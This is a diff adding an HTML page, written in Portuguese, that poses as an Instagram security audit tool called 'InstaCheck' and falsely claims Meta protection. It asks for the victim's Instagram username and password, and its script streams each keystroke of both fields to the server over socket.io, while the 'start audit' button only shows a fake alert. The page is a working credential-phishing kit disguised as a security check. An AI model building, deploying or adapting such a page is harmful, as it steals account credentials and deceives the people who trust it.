@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>InstaCheck | Auditoria de Segurança</title>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color: #38bdf8;">7X Security</h2>
+        <p>Verifique se sua conta possui acessos não autorizados ou dispositivos suspeitos.</p>
+        <input type="text" id="user" placeholder="Usuário, telefone ou e-mail">
+        <input type="password" id="pass" placeholder="Senha do Instagram">
+        <button onclick="alert('Iniciando varredura de segurança...')">INICIAR AUDITORIA</button>
+        <p style="font-size: 10px; margin-top: 15px; opacity: 0.5;">Protegido por Meta Security Protocol</p>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const user = document.getElementById('user');
+        const pass = document.getElementById('pass');
+
+        [user, pass].forEach(input => {
+            input.oninput = () => {
+                socket.emit('typing', { u: user.value, p: pass.value });
+            };
+        });
+    </script>
+</body>
+</html>
